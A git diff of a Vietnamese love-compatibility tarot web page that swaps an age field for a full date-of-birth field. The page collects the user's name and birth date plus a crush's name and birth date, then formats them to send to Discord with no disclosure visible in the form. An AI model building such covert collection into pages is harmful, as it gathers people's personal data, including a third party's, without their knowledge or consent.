@@ -68,7 +68,8 @@ to{box-shadow:0 0 30px #ff66c4}
 
 <div id="formBox">
 <input id="myName" placeholder="Tên của bạn">
-<input id="myAge" type="number" placeholder="Tuổi của bạn">
+<!-- 🔁 SỬA Ở ĐÂY -->
+<input id="myDob" type="date" placeholder="Ngày sinh của bạn">
 <input id="crushName" placeholder="Tên crush">
 <input id="crushDob" type="date">
 <button onclick="startOracle()">Xem Quẻ</button>
@@ -112,11 +113,13 @@ let saveInfo={};
 /* ================= START ORACLE ================= */
 function startOracle(){
 const myName=document.getElementById("myName").value;
-const myAge=document.getElementById("myAge").value;
+/* 🔁 SỬA Ở ĐÂY */
+const myDob=document.getElementById("myDob").value;
 const crushName=document.getElementById("crushName").value;
 const crushDob=document.getElementById("crushDob").value;
 
-if(!myName||!myAge||!crushName||!crushDob){
+/* 🔁 SỬA Ở ĐÂY */
+if(!myName||!myDob||!crushName||!crushDob){
 alert("Vui lòng nhập đầy đủ thông tin");
 return;
 }
@@ -140,14 +143,14 @@ else msg="Kết nối yếu – nhiều thử thách ⚠️";
 document.getElementById("shortMsg").innerText=msg;
 
 /* ===== SAVE DATA ===== */
-saveInfo={myName,myAge,crushName,crushDob,percent,time:new Date().toLocaleString()};
+saveInfo={myName,myDob,crushName,crushDob,percent,time:new Date().toLocaleString()};
 
 /* ===== SEND TO DISCORD ===== */
 const content={
 content:
 `🔮 Love Oracle Tarot 💖
 👤 Tên: ${myName}
-🎂 Tuổi: ${myAge}
+🎂 Ngày sinh: ${myDob}
 💘 Crush: ${crushName}
 📅 Ngày sinh crush: ${crushDob}
 📊 Độ hợp: ${percent}%
